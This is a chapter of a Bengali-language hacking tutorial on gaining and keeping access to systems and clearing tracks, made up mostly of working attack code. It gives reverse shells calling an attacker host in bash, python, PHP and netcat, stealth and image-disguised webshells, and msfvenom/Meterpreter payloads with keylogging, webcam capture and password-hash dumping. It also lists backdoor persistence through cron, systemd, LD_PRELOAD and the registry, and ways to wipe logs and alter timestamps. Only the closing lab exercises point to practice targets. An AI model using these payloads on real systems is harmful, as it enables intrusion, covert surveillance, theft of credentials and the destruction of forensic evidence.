# অধ্যায় ২৬: Gain Access / Maintain Access / Clearing Tracks (Web)

## সহজ কথায়:
তুমি vulnerability খুঁজলে। এখন target system-এ ঢোকার পালা। তারপর access ধরে রাখা। শেষে প্রমাণ মুছে ফেলা।

---

## ২৬.১ Reverse Shell (Code Collection)

### Bash Reverse Shell:

```bash
# Target machine-এ run:
bash -i >& /dev/tcp/192.168.1.5/4444 0>&1

# Short version:
bash -c 'bash -i >& /dev/tcp/192.168.1.5/4444 0>&1'

# URL encoded (web form-এ inject):
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.5%2F4444%200%3E%261%27
```

### Python Reverse Shell:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP Reverse Shell:

```php
<?php
// PHP Reverse Shell — upload করলেই shell
$sock = fsockopen("192.168.1.5", 4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```

### Netcat Reverse Shell:

```bash
# Linux:
nc -e /bin/sh 192.168.1.5 4444

# Windows:
nc.exe -e cmd.exe 192.168.1.5 4444

# (nc如果没有 -e):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.5 4444 >/tmp/f
```

### Attacker Listener:

```bash
# সবচেয়ে basic:
nc -lvnp 4444
# -l = listen, -v = verbose, -n = no DNS, -p = port

# উন্নত listener (rlwrap — arrow key support):
rlwrap nc -lvnp 4444

# Listen multiple ports:
nc -lvnp 4444 &
nc -lvnp 5555 &
```

### Upgrade Shell to Interactive:

```bash
# Once you get a shell, upgrade it:
python -c 'import pty;pty.spawn("/bin/bash")'
# Then Ctrl+Z → stty raw -echo; fg → Enter
```

---

## ২৬.২ Webshell Upload ও Management

### Simple Webshell (one-liner):

```php
<?php system($_GET['c']); ?>
```

### Stealth Webshell (harder to detect):

```php
<?php
// 😈 Stealth webshell — looks normal
// File name: logo.php
// Usage: logo.php?0=system&1=id
${$_GET[0]}($_GET[1]);
?>
```

### Image Webshell:

```bash
# Inject PHP into image (bypass upload filters):
echo '<?php system($_GET["c"]); ?>' > shell.php
cat image.jpg shell.php > image-shell.jpg

# Usage:
http://target/uploads/image-shell.jpg?c=id
```

### Webshell Management Tools:

```bash
# Weevely (Kali tool):
weevely generate password123 /tmp/shell.php
# Upload shell.php to target

# Connect:
weevely http://target/uploads/shell.php password123
# → Interactive shell interface!

# Weevely commands:
:help           # all commands
:system ls      # run system command
:file_upload local.txt remote.txt  # upload file
:file_download remote.txt          # download file
:audit_phpconf  # check PHP config
```

### China Chopper:

```bash
# Classic webshell (very small):
<?php @eval($_POST['a']);?>

# Client tool:
# https://github.com/Chora10/Cknife
```

---

## ২৬.৩ Meterpreter Session

Meterpreter = Metasploit-এর advanced shell। Post-exploitation tools built-in।

### Getting Meterpreter:

```bash
msfconsole

# Generate payload:
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o shell.elf

# Upload shell.elf to target → run:
./shell.elf

# Metasploit handler:
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
run
```

### Meterpreter Commands (Complete):

```bash
# System information:
sysinfo                    # OS, computer name
getuid                     # current user
getsystem                 # try to get SYSTEM/root

# File operations:
ls                         # list files
cd /home                  # change directory
pwd                       # current directory
download /etc/passwd      # download file
upload local.txt          # upload file to target
edit file.txt             # edit file on target
cat /etc/passwd           # read file

# Process:
ps                        # list processes
migrate 1234              # move to another process (stealth)
kill 1234                 # kill process

# Screenshot:
screenshot                # take screenshot
webcam_snap              # take webcam photo
webcam_stream            # live webcam stream

# Keylogging:
keyscan_start            # start keylogger
keyscan_dump             # dump captured keys

# Network:
ifconfig                 # network info
ipconfig                 # Windows
route                     # routing table
portfwd add -l 3389 -p 3389 -r 192.168.1.10  # port forward

# Persistence:
run persistence -X -i 30 -r 192.168.1.5 -p 4444
# -X = startup, -i 30 = reconnect every 30s
run scheduleme -m 1 -c "/bin/bash -i >& /dev/tcp/192.168.1.5/5555 0>&1"

# Privilege Escalation:
getsystem                 # attempt to get SYSTEM
use post/linux/gather/hashdump  # dump passwords
use post/windows/gather/hashdump

# Pivot (network jump):
run autoroute -s 10.0.0.0/24  # route through target
background                    # put session in background
route add 10.0.0.0/24 1      # route through session 1
```

---

## ২৬.৪ Persistence Mechanisms

### Linux Persistence:

```bash
# 1. SSH Key Backdoor:
mkdir -p ~/.ssh
echo "your-public-key-here" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 2. Cron Job:
(crontab -l; echo "@reboot /path/to/backdoor") | crontab -
echo "* * * * * /path/to/backdoor" | crontab -

# 3. .bashrc:
echo '/path/to/reverse_shell.sh' >> ~/.bashrc

# 4. Systemd Service:
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update
[Service]
ExecStart=/bin/bash /root/backdoor.sh
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
EOF

systemctl enable update.service
systemctl start update.service

# 5. LD_PRELOAD:
echo "/path/to/malicious.so" > /etc/ld.so.preload
```

### Windows Persistence:

```powershell
# 1. Registry Run:
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\backdoor.exe"

# 2. Scheduled Task:
schtasks /create /tn "WindowsUpdate" /tr "C:\backdoor.exe" /sc onstart /ru SYSTEM

# 3. Service:
sc create "WindowsUpdateSvc" binPath= "C:\backdoor.exe"
sc start "WindowsUpdateSvc"

# 4. WMI Event:
# Using PowerSploit: New-Persistence

# 5. Startup Folder:
copy backdoor.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```

---

## ২৬.৫ Clearing Tracks (Complete)

### Linux Log Cleansing:

```bash
# Delete specific IP from logs:
grep -v "192.168.1.5" /var/log/auth.log > /tmp/clean.log
cp /tmp/clean.log /var/log/auth.log

# Wipe entire log:
shred -f -z -u /var/log/auth.log  # Overwrite + delete
shred -f -z -u /var/log/syslog

# Clear command history:
history -c
history -w
cat /dev/null > ~/.bash_history
cat /dev/null > ~/.zsh_history

# Remove last login record:
# /var/log/wtmp — last login
# /var/log/btmp — failed login
shred /var/log/wtmp
shred /var/log/btmp

# Clear journalctl logs:
journalctl --rotate
journalctl --vacuum-time=1s

# Disable logging (if you have root):
service rsyslog stop
systemctl stop syslog.socket
```

### Windows Log Cleansing:

```powershell
# Clear event logs:
wevtutil cl Application
wevtutil cl System
wevtutil cl Security
wevtutil cl Setup
wevtutil cl ForwardedEvents

# Delete log files:
del C:\Windows\System32\winevt\Logs\*.evtx

# Clear PowerShell history:
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Clear prefetch:
del C:\Windows\Prefetch\*.* /q

# Clear recent files:
del C:\Users\%username%\Recent\*.* /q

# Clear recycle bin:
Clear-RecycleBin -Force
```

### Timestomp (Timestamps বদলানো):

```bash
# Linux touch:
touch -t 202001011200.00 backdoor.mp3
# Dates: 2020-01-01 12:00

# Windows (PowerShell):
(Get-Item file.exe).CreationTime = "01/01/2020 12:00"
(Get-Item file.exe).LastWriteTime = "01/01/2020 12:00"

# Metasploit timestomp:
timestomp -v /path/to/file
timestomp -f /path/to/file  # change to another file's timestamp
```

---

## 💡 ল্যাব এক্সারসাইজ

```
১. Reverse Shell Practice:
   - Kali-তে listener: nc -lvnp 4444
   - অন্য terminal থেকে: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
   - Shell পেলে? Grade yourself

২. Webshell:
   - DVWA তে webshell.php upload করো
   - Weevely connect করো

৩. Meterpreter:
   - msfvenom payload generate করো
   - Handler setup → shell পাও
   - sysinfo, getuid, screenshot

৪. Clear tracks practice:
   - তোমার নিজের VM-এ কিছু command চালাও
   - history -c
   - log clear technique
```

---

## 📌 মনে রাখো

| Technique | Tool/Code | Purpose |
|-----------|-----------|---------|
| **Reverse Shell** | bash/python/php | Remote access |
| **Webshell** | PHP one-liner | Persistent web access |
| **Meterpreter** | msfvenom + handler | Advanced post-exploit |
| **Persistence** | cron, systemd, registry | Stay forever |
| **Clear Tracks** | shred, wevtutil, timestomp | Evade detection |

**পার্ট ৭ — Metasploit Framework A-Z! 🚀**
